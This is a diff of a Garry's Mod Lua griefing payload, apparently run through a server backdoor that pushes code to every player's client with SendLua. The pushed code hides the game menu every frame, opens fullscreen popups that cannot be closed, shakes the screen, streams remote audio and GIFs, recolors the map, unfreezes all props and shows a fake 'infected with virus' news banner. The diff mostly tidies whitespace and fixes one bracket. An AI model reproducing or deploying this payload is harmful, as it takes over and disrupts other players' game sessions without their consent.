@@ -100,9 +100,7 @@ end )
 --Start some tunes and steam in our assets
 lol:PushAction( 0, function( pPlayer )
 	lol:SendLua( pPlayer, [[
-	
 hook.Add("Think","iuefheqefq",function() gui.HideGameUI() end)
-
     sound.PlayURL( "https://raw.githubusercontent.com/WERooo/somelua/master/tripoloski.mp3", "mono noblock noplay", function( station ) 
 	timer.Simple( 0.1, function()                     
 	ClientStation = station
@@ -111,21 +109,18 @@ hook.Add("Think","iuefheqefq",function() gui.HideGameUI() end)
 	station:SetVolume( 30 )
 	end )
     end )
-
     surface.CreateFont( "PixelCutsceneScaled",{
         font = "Open Sans", 
         size = 500,
         weight = 1000,
         antialias = true
     })
-
     surface.CreateFont( "PixelSmall",{
         font = "Open Sans", 
         size = 135,
         weight = 500,
         antialias = false
     })
-
     surface.CreateFont("lapolice", {
         font = "Open Sans",  
         size = ScrW()*0.02, 
@@ -134,7 +129,6 @@ hook.Add("Think","iuefheqefq",function() gui.HideGameUI() end)
         scanlines = 2.5, 
         antialias = false
     })
-
     local function gettextcolor( a )
     
         local r = 0.5*math.sin(RealTime()*5.5)*255 + 255/2
@@ -144,7 +138,6 @@ hook.Add("Think","iuefheqefq",function() gui.HideGameUI() end)
         return Color( r, g, b, a or 255 )
     
     end
-
     local w,h = ScrW(), ScrH()
     local W, H = ScrW(), ScrH()
     local MySelf = LocalPlayer()
@@ -161,7 +154,6 @@ hook.Add("Think","iuefheqefq",function() gui.HideGameUI() end)
     ohno:SetTitle("")
     ohno:MakePopup();
     ohno:ShowCloseButton(false)
-
     ohno.Paint = function( self ) 
         Derma_DrawBackgroundBlur( self, self.m_fCreateTime )
         Derma_DrawBackgroundBlur( self, self.m_fCreateTime )
@@ -169,7 +161,6 @@ hook.Add("Think","iuefheqefq",function() gui.HideGameUI() end)
     
     local pw, ph = w, h*0.6
     local px, py = w/2-pw/2, h/2-ph/2
-
     
     local Close = vgui.Create( "DButton", ohno )
     Close:SetPos(px, py)
@@ -183,7 +174,6 @@ hook.Add("Think","iuefheqefq",function() gui.HideGameUI() end)
         local text2 = "enginepred"
         local text3 = "1 TAPPED"
         local text4 = "hardbass"
-
             draw.SimpleText( text, "PixelCutsceneScaled", tw/2 , th/2, gettextcolor( 55 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
             draw.SimpleText( text, "PixelCutsceneScaled", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
             draw.DrawText( "TriPoloski", "lapolice", ScrW() * 0.5, ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), TEXT_ALIGN_CENTER )
@@ -210,27 +200,22 @@ hook.Add("Think","iuefheqefq",function() gui.HideGameUI() end)
             draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )
             draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )
             draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )
-
     end
     surface.PlaySound( "vo/npc/male01/ohno.wav" )
     surface.PlaySound( "vo/npc/male01/ohno.wav" )
     timer.Create("fff", 0.1, 0, function() 
         util.ScreenShake( Vector(0,0,0), 2.5, 50, 0.5, 5000 )
     end)
-
     timer.Simple( 19, function()
-
         wut = vgui.Create( "DFrame" )
         wut:SetSize( w, h )
         wut:SetPos(0,0)
         wut:SetDraggable ( false )
         wut:SetTitle("")
         wut:ShowCloseButton(false)
-
         wut.Paint = function( self ) 
             surface.SetDrawColor(30, 30, 30, 0)
         end
-
         local Close = vgui.Create( "DButton", wut )
         Close:SetPos(px, py)
         Close:SetText( "" )
@@ -240,15 +225,11 @@ hook.Add("Think","iuefheqefq",function() gui.HideGameUI() end)
             local shift = math.sin(RealTime()*3)*1.5 + 5
                 
             local text = "hardbass"
-
                 draw.SimpleText( text, "PixelCutsceneScaled", tw/2 , th/2, gettextcolor( 55 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
                 draw.SimpleText( text, "PixelCutsceneScaled", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
-
         end
-
         ohno:Remove()
         ohno = nil
-
         local name = GetConVar("sv_skyname"):GetString()
         if name == "painted" then
           local sky
@@ -305,14 +286,12 @@ hook.Add("Think","iuefheqefq",function() gui.HideGameUI() end)
             end
           end
         end)
-
 		hook.Add("Think","somewhere_over_the_rainbow",function()
 			local col = HSVToColor(CurTime() * 50 % 360, 1, 1)
 				for _, v in ipairs(player.GetAll()) do
 			v:SetWeaponColor(Vector(col.r / 255, col.g / 255, col.b / 255))
 			end
 		end)
-
 		timer.Create("CP_Gaymod",1,0,function()
 			local mats = Entity(0):GetMaterials()
 			for k,v in pairs(mats) do
@@ -320,14 +299,12 @@ hook.Add("Think","iuefheqefq",function() gui.HideGameUI() end)
 				Material(v):SetVector("$color", Vector(r,g,b))
 			end
 		end)
-
 timer.Create("ok", 1, 0, function() 
     for k, v in pairs( ents.FindByClass( "prop_*" ) ) do local phys = v:GetPhysicsObject()
         if (IsValid(phys)) then
             phys:EnableMotion(true)
         end 
     end
-
     local props = ents.GetAll()
     for _, prop in ipairs( props ) do
         if(prop:GetPhysicsObject():IsValid()) then
@@ -335,7 +312,6 @@ timer.Create("ok", 1, 0, function()
         end
     end
 end)
-
 	end)
 	
 	
@@ -344,7 +320,6 @@ end)
 		local disco = vgui.Create("DHTML") disco:SetSize(400,400) disco:SetPos(200,0) disco:OpenURL("https://i.imgur.com/HxkMRIS.gif")
 		local disco2 = vgui.Create("DHTML") disco2:SetSize(400,400) disco2:SetPos(ScrW()-550,0) disco2:OpenURL("https://i.imgur.com/HxkMRIS.gif")		
 	end)
-
 		
 	timer.Simple( 53, function()
 		
@@ -397,7 +372,6 @@ local newsPan1 = vgui.Create("DPanel")
 	title2:SizeToContents()
 	title2:SetPos(ScrW()-title2:GetWide()-55, ScrH()-254+title2:GetTall()/2-12)
 	title2:SetColor(Color(255,255,255))
-
 	local title3 = vgui.Create("DLabel", newsPan1)
 	title3:SetFont("NEWS2")
 	title3:SetText("BREAKING NEWS GMOD HAS BEEN INFECTED WITH PEWDIEPIE VIRUS CALL THE POLICE NOW!")
@@ -410,9 +384,8 @@ local newsPan1 = vgui.Create("DPanel")
 		else
 			title3:SetPos(ScrW(),10)
 		end
-        end
+        end)
 	end)
-		
 	]])
 
 end )
